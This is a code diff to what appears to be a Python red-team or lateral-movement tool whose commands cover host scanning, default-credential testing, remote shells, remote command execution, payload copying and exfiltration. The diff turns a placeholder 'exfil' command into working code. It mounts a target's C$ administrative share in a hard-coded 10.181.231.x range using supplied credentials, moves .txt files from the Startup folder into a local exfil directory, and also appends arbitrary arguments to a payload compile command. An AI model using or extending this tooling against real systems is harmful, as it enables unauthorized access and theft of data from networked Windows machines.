@@ -35,7 +35,7 @@ validCommands = ["scan", "hosts", "credtest", "getcmd", "rexec", "rcpy", "msg", 
 validDesc = [
     "Run a scan to identify hosts on the network", "View or edit host information", "Test to see if default creds work", "Open a shell on a remote system (user / pass)", "Run a command on a single or a group of PCs (add default to use 'Default' list)", "rexec but copy and execute a file from this system", "Message a single or group of computers", "View or edit intel on a given IP", "Edit the list of shared intel ", "Exfiltrate data from a remote host"
 ]
-validUsage = ["scan ([arp])", "hosts (update) (add/remove [ip] [list])", "credtest [username:password] [list name to save under]", "getcmd [ip] [username] [password]", "rexec [list name] [username:password] [command]", "rcpy [list name] [username:password] [payload name] ([remote])", "msg [list name] [num times] ", "intel [ip] ([add/remove] [information to add/remove])", "source [add/del/list] ([ip])", "exfil [ip] ([path])"]
+validUsage = ["scan ([arp])", "hosts (update) (add/remove [ip] [list])", "credtest [username:password] [list name to save under]", "getcmd [ip] [username] [password]", "rexec [list name] [username:password] [command]", "rcpy [list name] [username:password] [payload name] ([remote])", "msg [list name] [num times] ", "intel [ip] ([add/remove] [information to add/remove])", "source [add/del/list] ([ip])", "exfil [target] [username:password]"]
 
 ipNames = []
 customLists = []
@@ -486,7 +486,11 @@ def menu():
                         print("|\n|__[+] %s" % line.replace("\n", ""))
                         beep()
         if cmd[0] == "exfil":
-            print("WIP: Exfiltrate data...")
+            if len(cmd) == 3:
+                creds = cmd[2].split(":")
+                exfil(cmd[1], "C$\\ProgramData\\Microsoft\\Windows",creds[0], creds[1])
+            else:
+                print("Incorrect usage: see \"usage\" command")
 
 
 def getintel(host):
@@ -587,7 +591,7 @@ def rexecT(tgt=0, uname="", pword="", cmd="", index=0, sav=False, listIndex=0): 
     completeFlags[index] = 1
 
 
-def rcpy(targetList, payload, creds, remote=False):
+def rcpy(targetList, payload, creds, args="", remote=False):
     global completeFlags
     global customLists
     completeFlags = []
@@ -602,7 +606,7 @@ def rcpy(targetList, payload, creds, remote=False):
             payload_cmd = cs_path + " -out:" + os.getcwd() + "\\payloads\\pl.exe " + os.getcwd() + "\\payloads\\" + payload
         payload = "payloads\\pl.exe"
         print(payload_cmd)
-        os.system(payload_cmd)
+        os.system(payload_cmd + " " + args)
     for i in targetList:
         completeFlags.append(0)
         x = threading.Thread(target=rcpyT, args=(remote, i, uname, password, payload, index))
@@ -706,6 +710,20 @@ def rmsg(targets, reason, num):
 def rmsgT(reason="", target=""):
     print("[+] MESSAGING:", target)
     os.system(r'msg Admin /SERVER %s %s' % (target, reason))
+
+
+def exfil(target, path, usr, passwd):
+    targetpath = "\\\\10.181.231." + target + "\\" + path
+    print(targetpath)
+    if not os.path.exists("\\exfil"):
+        os.system("mkdir exfil")
+    os.system(r'net use m: ' + targetpath + ' /user:' + usr + " " + passwd)
+    try:
+        os.system("move " + '"M:\Start Menu\Programs\StartUp\*.txt" ' + os.getcwd() + "\\exfil\\")
+    except Exception as ex:
+        print("Unable to copy file. %s" % ex)
+    finally:
+        os.system('net use m: /del /Y')
 
 
 def getDependencies():
